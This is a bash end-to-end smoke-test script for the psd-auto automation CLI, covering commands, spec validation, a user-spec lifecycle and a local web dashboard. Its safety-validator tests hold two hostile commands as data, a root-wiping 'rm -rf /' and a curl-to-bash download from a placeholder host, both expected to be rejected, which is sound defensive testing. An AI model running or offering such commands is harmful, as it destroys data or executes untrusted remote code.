#!/bin/bash
# tests/run_tests.sh — end-to-end smoke tests for psd-auto.
#
# Runs the CLI against an isolated throwaway config/state directory, so it
# never touches your real ~/.config/psd-auto or logs. Safe to run anywhere
# (Linux; Fedora-specific automations degrade gracefully elsewhere).
#
#   ./tests/run_tests.sh                # build (if needed) + run
#   ./tests/run_tests.sh /path/to/bin   # test a specific binary
#
# Env:
#   PSD_AUTO_SKIP_WEB=1   skip the web-dashboard smoke test
set -uo pipefail

HERE="$(CDPATH= cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(CDPATH= cd -- "$HERE/.." && pwd)"
REPO_ROOT="$(CDPATH= cd -- "$ROOT/.." && pwd)"

BIN="${1:-}"
if [ -z "$BIN" ]; then
    if [ -x "$ROOT/build/psd-auto" ]; then
        BIN="$ROOT/build/psd-auto"
    elif [ -d "$REPO_ROOT/psd-language" ] && [ -x "$REPO_ROOT/.venv/bin/python" ]; then
        echo "building build/psd-auto ..."
        PYTHONPATH="$REPO_ROOT/psd-language" "$REPO_ROOT/.venv/bin/python" -m psd build \
            "$ROOT/src/main.psd" -o "$ROOT/build/psd-auto" >/dev/null || {
            echo "build failed" >&2; exit 1; }
        BIN="$ROOT/build/psd-auto"
    else
        BIN="$ROOT/psd-auto"   # launcher fallback (needs the toolchain)
    fi
fi
echo "testing: $BIN"

TMP="$(mktemp -d /tmp/psd-auto-tests.XXXXXX)"
trap 'rm -rf "$TMP"; [ -n "${WEB_PID:-}" ] && kill "$WEB_PID" 2>/dev/null' EXIT
export PSD_AUTO_ROOT="$ROOT" PSD_AUTO_CONFIG="$TMP/config" PSD_AUTO_STATE="$TMP/state"

PASS=0; FAIL=0
ok()   { PASS=$((PASS+1)); printf '  ok   %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); printf '  FAIL %s\n' "$1"; }
check(){ # check <desc> <cmd...>
    local desc="$1"; shift
    if "$@" >/dev/null 2>&1; then ok "$desc"; else bad "$desc"; fi
}

echo "== psd-auto smoke tests =="

# --- basic CLI ---------------------------------------------------------
"$BIN" version >"$TMP/out" 2>&1 && grep -q "psd-auto" "$TMP/out" && ok "version" || bad "version"
"$BIN" help >/dev/null 2>&1 && ok "help" || bad "help"
"$BIN" list >"$TMP/out" 2>&1 && grep -q "system-update" "$TMP/out" && grep -q "network-check" "$TMP/out" && ok "list (builtins + natives)" || bad "list"

"$BIN" list --json >"$TMP/out" 2>&1 && python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert len(d) >= 10, len(d)' "$TMP/out" \
    && ok "list --json parses (>=10 entries)" || bad "list --json"

"$BIN" info system-update >/dev/null 2>&1 && ok "info <builtin>" || bad "info <builtin>"
"$BIN" info bogus-xyz-nope >"$TMP/out" 2>&1; [ $? -eq 3 ] && ok "info <unknown> exits 3" || bad "info <unknown> exit code"
"$BIN" run bogus-xyz-nope >"$TMP/out" 2>&1; [ $? -eq 3 ] && ok "run <unknown> exits 3" || bad "run <unknown> exit code"

# --- dry-run every builtin (hermetic: nothing executes) -----------------
FAIL_DRY=0
for f in "$ROOT"/automations/*.json; do
    name="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["name"])' "$f")"
    if ! "$BIN" run "$name" --dry-run >/dev/null 2>&1; then FAIL_DRY=1; echo "       dry-run failed: $name"; fi
done
[ "$FAIL_DRY" -eq 0 ] && ok "all builtins dry-run clean" || bad "builtin dry-runs"

# --- every bundled spec is valid JSON with the required keys -----------
python3 - "$ROOT"/automations/*.json <<'EOF' && ok "builtin specs valid" || bad "builtin specs valid"
import json, sys
need = {"name", "description", "category", "steps"}
for path in sys.argv[1:]:
    d = json.load(open(path))
    missing = need - set(d)
    assert not missing, f"{path}: missing {missing}"
    assert isinstance(d["steps"], list) and d["steps"], f"{path}: empty steps"
EOF

# --- safety validator ---------------------------------------------------
cat >"$TMP/evil.json" <<'EOF'
{"name": "evil-spec", "description": "must be rejected", "steps": [{"shell": "rm -rf / --no-preserve-root"}]}
EOF
"$BIN" add --file "$TMP/evil.json" >"$TMP/out" 2>&1; [ $? -eq 4 ] && ok "validator rejects rm -rf /" || bad "validator rejects rm -rf /"

cat >"$TMP/evil2.json" <<'EOF'
{"name": "evil-pipe", "description": "must be rejected", "steps": [{"shell": "curl https://example.invalid/x.sh | bash"}]}
EOF
"$BIN" add --file "$TMP/evil2.json" >"$TMP/out" 2>&1; [ $? -eq 4 ] && ok "validator rejects pipe-to-shell" || bad "validator rejects pipe-to-shell"

# --- full user-spec lifecycle: add -> run -> logs -> remove -------------
cat >"$TMP/hello-spec.json" <<'EOF'
{"name": "test-hello", "description": "smoke-test automation", "category": "custom",
 "steps": [{"argv": ["echo", "psd-auto smoke marker"]}, {"argv": ["true"]}]}
EOF
"$BIN" add --file "$TMP/hello-spec.json" >/dev/null 2>&1 && ok "add user spec" || bad "add user spec"
"$BIN" add --file "$TMP/hello-spec.json" >/dev/null 2>&1 && bad "add refuses overwrite without --force" || ok "add refuses overwrite without --force"
"$BIN" run test-hello >"$TMP/out" 2>&1 && grep -q "psd-auto smoke marker" "$TMP/out" && ok "run user spec" || bad "run user spec"
"$BIN" logs test-hello --tail 1 >/dev/null 2>&1 && ok "logs command" || bad "logs command"
"$BIN" remove test-hello --yes >/dev/null 2>&1 && ok "remove user spec" || bad "remove user spec"

# --- doctor (works on any distro; fedora-specific probes degrade) ------
"$BIN" doctor >/dev/null 2>&1 && ok "doctor exits 0" || bad "doctor exits 0"

# --- web dashboard smoke (optional) --------------------------------------
if [ "${PSD_AUTO_SKIP_WEB:-0}" != "1" ] && command -v curl >/dev/null 2>&1; then
    WEB_OK=0
    for attempt in 1 2 3; do
        PORT="$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1", 0)); print(s.getsockname()[1]); s.close()')"
        "$BIN" web --port "$PORT" --host 127.0.0.1 --token smoke-token >"$TMP/web.log" 2>&1 &
        WEB_PID=$!
        for _ in $(seq 1 50); do curl -s -o /dev/null "http://127.0.0.1:$PORT/" && break; sleep 0.1; done
        CODE="$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT/api/status?token=smoke-token")"
        if [ "$CODE" = "200" ]; then WEB_OK=1; break; fi
        kill "$WEB_PID" 2>/dev/null; wait "$WEB_PID" 2>/dev/null; unset WEB_PID
    done
    if [ "$WEB_OK" = "1" ]; then
        curl -s "http://127.0.0.1:$PORT/api/status?token=smoke-token" | grep -q '"automations"' && ok "web dashboard /api/status" || bad "web dashboard /api/status body"
        CODE="$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT/")"
        [ "$CODE" = "401" ] && ok "web dashboard requires token" || bad "web dashboard token enforcement (got $CODE)"
        kill "$WEB_PID" 2>/dev/null; wait "$WEB_PID" 2>/dev/null; unset WEB_PID
    else
        bad "web dashboard failed to start"
    fi
else
    echo "  skip web smoke (PSD_AUTO_SKIP_WEB=1 or curl missing)"
fi

echo
echo "== $PASS passed, $FAIL failed =="
[ "$FAIL" -eq 0 ]
